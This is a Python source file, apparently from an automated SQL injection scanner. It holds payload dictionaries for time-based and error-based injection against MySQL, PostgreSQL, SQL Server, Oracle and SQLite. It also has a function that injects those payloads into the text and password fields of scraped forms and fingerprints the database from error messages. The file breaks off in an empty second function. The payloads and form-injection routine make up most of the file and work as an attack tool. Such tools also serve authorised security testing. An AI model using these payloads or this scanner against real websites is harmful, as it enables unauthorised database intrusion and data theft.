from utils.ainsi import *

import requests
from bs4 import BeautifulSoup

db_error_signatures = {
        "MySQL": ["mysql_fetch_array", "warning: mysql", "supplied argument is not a valid mysql result", "mysql error", "you have an error in your sql syntax"],
        "PostgreSQL": ["postgresql error", "pg_query", "syntax error at or near", "error: syntax error"],
        "SQL Server": ["microsoft odbc driver for sql server", "sqlstate", "unclosed quotation mark", "incorrect syntax near", "sql server"],
        "Oracle": ["ora-00933", "ora-01722", "oracle error"],
        "SQLite": ["sqlite error", "near \"select\": syntax error"]
    }

time_based_payloads = {
        "MySQL": "' AND SLEEP(5)--",
        "PostgreSQL": "' AND pg_sleep(5)--",
        "SQL Server": "'; WAITFOR DELAY '0:0:5'--",
        "Oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--"
    }

error_based_db_payloads = {
        "MySQL": ["' AND 1=CONVERT(int,(SELECT @@version))--", "' AND 1=BENCHMARK(1000000,MD5(1))--"],
        "PostgreSQL": ["' AND 1=(SELECT CAST(version() AS INT))--", "' AND 1=CAST((SELECT version()) AS INT)--"],
        "SQL Server": ["' AND 1=CONVERT(int,(SELECT @@version))--", "'; SELECT CAST(@@version AS INT);--"],
        "Oracle": ["' AND 1=(SELECT TO_NUMBER('a') FROM DUAL)--", "' AND 1=UTL_INADDR.GET_HOST_ADDRESS(('a'))--"],
        "SQLite": ["' AND 1=ABS(CAST(SQLITE_VERSION() AS INTEGER))--"]
    }  

def identify_db_post(scrapped_data):
    for url in scrapped_data:
        # print(f"{colored(url, RED)}")
        
        for db_type, payloads in error_based_db_payloads.items():
            for payload in payloads:
                
                response = requests.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                inputs = soup.find_all('input')
                # input_data = {input_tag.get('name', f'input_{i}'): input_tag.get('value', '') for i, input_tag in enumerate(inputs)}
                input_data = {}
                for i, input in enumerate(inputs):
                    if "input" in str(input) and ('type="password"' in str(input) or 'type="text"' in str(input)):
                        if i == 0:
                            input_data[input.get('name', f'input_{i}')] = payload
                        else:
                            input_data[input.get('name', f'input_{i}')] = "pass"
                    
                
                response = requests.post(url, data=input_data)
                response_text_lower = response.text.lower()
                
                
                for signature in db_error_signatures.get(db_type, []):
                    if signature in response_text_lower:
                        print(f"{colored('🟢 Detection:', WHITE, styles=BOLD)} {colored(url, GREEN, styles=BLINK)} > {colored(db_type, MAGENTA, styles=BOLD)} - {colored('error-based', CYAN, styles=BOLD)}")
                        return True, db_type, "error-based"
    
      
        
    return False, None, None
                
def check_sql_injection_post(url):  
    success = False
    db_identify = None
    
     
                
            
        
        
    